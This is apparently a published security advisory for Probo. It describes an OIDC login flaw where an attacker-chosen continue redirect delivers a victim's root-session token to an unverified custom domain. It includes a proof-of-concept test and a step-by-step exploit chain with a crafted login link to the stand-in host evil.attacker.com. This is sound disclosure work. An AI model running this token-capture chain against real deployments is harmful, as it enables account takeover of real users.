# GHSA-r9mf-88r7-g6j9 — Account takeover via OIDC login: the continue redirect hands the victim's root-session token to any unverified custom domain

- **Advisory:** [GHSA-r9mf-88r7-g6j9](https://github.com/getprobo/probo/security/advisories/GHSA-r9mf-88r7-g6j9)
- **Severity:** High · CWE-384 (Session Fixation), CWE-601 (Open Redirect)
- **Affected:** `< 0.234.0` · **Patched:** `0.234.0`
- **Status:** publicly disclosed and fixed. Reported by **Pig-Tail** through coordinated disclosure.

## Summary

After a successful "Sign in with Google/Microsoft", Probo could redirect the browser to a
session-transfer URL carrying the user's root session as a **signed token in the query string**, so
a trust-center custom domain could set its own cookie. The destination host was validated only
against the global set of *all* tenants' custom domains, and that lookup returned **unverified**
domains — a custom domain could be created by any Owner with no DNS-ownership proof. Combined with
the `continue` URL in the OIDC login-initiation link being fully attacker-chosen and never bound to
the authenticating victim, an attacker could register a custom domain they control, send the victim
an ordinary Probo OIDC login link, and receive the victim's root-session token when the victim
logged in — full account takeover of any user who clicked the link, including OWNERs/ADMINs.

## Root cause

1. `allowedRedirectHost` / `isTrustCenterDomain` (`pkg/server/api/api.go`) accept any host returned
   by `Trust.GetByDomainName`, i.e. **any registered custom domain of any tenant**.
2. `buildSessionTransferURL` (`pkg/server/api/connect/v1/oidc_handler.go`) signs the victim's root
   session id into a token and 302s the browser to `https://<custom-domain>/api/trust/v1/session-transfer?token=...`.
3. `GetByDomainName` → `LoadByDomain` (`pkg/coredata/custom_domain.go`) has no `ssl_status`/verified
   predicate — a freshly-created, unverified domain is returned immediately.
4. `CreateCustomDomain` (`pkg/probo/custom_domain_service.go`) validates only the domain string
   format and inserts the row — no DNS TXT/CNAME/ACME ownership proof — and is a normal Owner action
   any attacker can trigger by signing up for their own free organization.
5. `session_transfer_handler.go` verifies the token and sets the **victim's session cookie** for
   whoever presents it — the token TTL is 60s and it is not single-use.

## Proof of Concept

`poc/sessionxfer_poc_test.go` calls the real, unmodified `SignSessionTransfer` /
`VerifySessionTransfer` functions from `pkg/server/api/authn/` exactly as `buildSessionTransferURL`
does, and shows the token handed to the attacker-chosen `continue` host decodes back to the
**victim's root session id** — i.e. it is a full-session bearer credential delivered in a URL.

To run against a checkout of the vulnerable tree (`< 0.234.0`):

```sh
git clone https://github.com/getprobo/probo.git
cp poc/sessionxfer_poc_test.go probo/pkg/server/api/authn/sessionxfer_poc_test.go
cd probo && go test ./pkg/server/api/authn/ -run TestSessionXfer_TokenCarriesVictimRootSession -v
```

Expected (benign) output:

```
=== RUN   TestSessionXfer_TokenCarriesVictimRootSession
    sessionxfer_poc_test.go:27: SESSIONXFER CONFIRMED: signed token delivered to attacker host
        "https://evil.attacker.com/api/trust/v1/session-transfer" carries victim root session
        "session_VICTIM_ROOT_abc123" => account takeover.
--- PASS: TestSessionXfer_TokenCarriesVictimRootSession (0.00s)
```

No network access; benign sentinel session-id string; no destructive activity.

## Exploit path (full chain, hop-by-hop)

1. Attacker signs up for a free Probo organization (Owner of their own org) and registers a custom
   domain they control, e.g. `evil.attacker.com`, DNS pointed at their own capture server — no
   verification required for it to be returned by `GetByDomainName`.
2. Attacker sends the victim an ordinary Probo login link:
   `https://app.probo.com/api/connect/v1/oidc/google/login?continue=https://evil.attacker.com/x`.
3. Victim clicks and completes a normal login with their own identity provider.
4. `oidc_handler` accepts the `continue` host, builds the session-transfer URL carrying the victim's
   root session token, and 302s the browser to
   `https://evil.attacker.com/api/trust/v1/session-transfer?token=<victim root session>`.
5. The victim's browser connects to `evil.attacker.com` (DNS → attacker's server); the attacker
   captures the token.
6. The attacker replays the token to `https://app.probo.com/api/trust/v1/session-transfer?token=...`;
   the handler verifies it and sets the victim's root-session cookie in the attacker's browser —
   account takeover.

## Fix

`0.234.0`: the OIDC redirect allowlist is bound to the authenticating identity's own organization(s)
instead of the global custom-domain set; custom domains require DNS-ownership verification
(`ssl_status = active`) before being usable as a redirect/session-transfer target; the
session-transfer token is no longer a bare bearer credential exposed via URL query string.
